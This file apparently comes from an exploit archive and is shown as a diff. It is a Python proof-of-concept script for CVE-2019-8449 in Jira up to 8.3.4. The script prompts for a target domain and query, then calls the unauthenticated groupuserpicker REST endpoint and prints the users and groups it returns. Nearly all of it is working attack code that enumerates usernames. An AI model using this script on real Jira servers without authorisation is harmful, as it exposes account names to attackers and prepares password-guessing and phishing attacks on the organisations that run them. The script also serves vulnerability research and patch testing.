@@ -1,0 +1,88 @@
+# Exploit Title: Jira 8.3.4 - Information Disclosure (Username Enumeration)
+# Date: 2019-09-11
+# Exploit Author: Mufeed VH
+# Vendor Homepage: https://www.atlassian.com/
+# Software Link: https://www.atlassian.com/software/jira
+# Version: 8.3.4
+# Tested on: Pop!_OS 19.10
+# CVE : CVE-2019-8449
+
+# CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4
+# DETAILS :: https://www.cvedetails.com/cve/CVE-2019-8449/
+# CONFIRM :: https://jira.atlassian.com/browse/JRASERVER-69796
+
+#!/usr/bin/env python
+
+
+__author__  = "Mufeed VH (@mufeedvh)"
+
+import os
+import requests
+
+
+class CVE_2019_8449:
+    def ask_for_domain(self):
+        domain = raw_input("[>] Enter the domain of Jira instance: => ")
+        if domain == "":
+            print("\n[-] ERROR: domain is required\n")
+            self.ask_for_domain()
+        self.url = "https://{}/rest/api/latest/groupuserpicker".format(domain)
+
+    def ask_for_query(self):
+        self.query = raw_input("[>] Enter search query: [required] (Example: admin) => ")
+        if self.query == "":
+            print("\n[-] ERROR: The query parameter is required\n")
+            self.ask_for_query()    
+
+    def exploit(self):
+        self.ask_for_domain()
+        self.ask_for_query()
+
+        maxResults = raw_input("\n[>] Enter the number of maximum results to fetch: (50) => ")
+        showAvatar = raw_input("\n[>] Enter 'true' or 'false' whether to show Avatar of the user or not: (false) => ")
+        fieldId = raw_input("\n[>] Enter the fieldId to fetch: => ")
+        projectId = raw_input("\n[>] Enter the projectId to fetch: => ")
+        issueTypeId = raw_input("\n[>] Enter the issueTypeId to fetch: => ")
+        avatarSize = raw_input("\n[>] Enter the size of Avatar to fetch: (xsmall) => ")
+        caseInsensitive = raw_input("\n[>] Enter 'true' or 'false' whether to show results case insensitive or not: (false) => ")
+        excludeConnectAddons = raw_input("\n[>] Indicates whether Connect app users and groups should be excluded from the search results. If an invalid value is provided, the default value is used: (false) => ")    
+
+        params = {
+            'query': self.query, 
+            'maxResults': maxResults, 
+            'showAvatar': showAvatar, 
+            'fieldId': fieldId, 
+            'projectId': projectId, 
+            'issueTypeId': issueTypeId, 
+            'avatarSize': avatarSize, 
+            'caseInsensitive': caseInsensitive, 
+            'excludeConnectAddons': excludeConnectAddons
+        }
+
+        send_it = requests.get(url = self.url, params = params)
+
+        try:
+            response = send_it.json()
+        except:
+            print("\n[-] ERROR: Something went wrong, the request didn't respond with a JSON result.")
+            print("[-] INFO: It is likely that the domain you've entered is wrong or this Jira instance is not exploitable.")
+            print("[-] INFO: Try visting the target endpoint manually ({}) and confirm the endpoint is accessible.".format(self.url))
+            quit()
+        
+        print("\n<========== RESPONSE ==========>\n")
+        print(response)
+        print("\n<==============================>\n")
+
+if __name__ == '__main__':
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    print('''
+        ================================================
+        |                                              |
+        | CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4 |
+        |  Proof of Concept By: Mufeed VH [@mufeedvh]  |
+        |                                              |
+        ================================================
+    ''')
+
+    CVE_2019_8449().exploit()
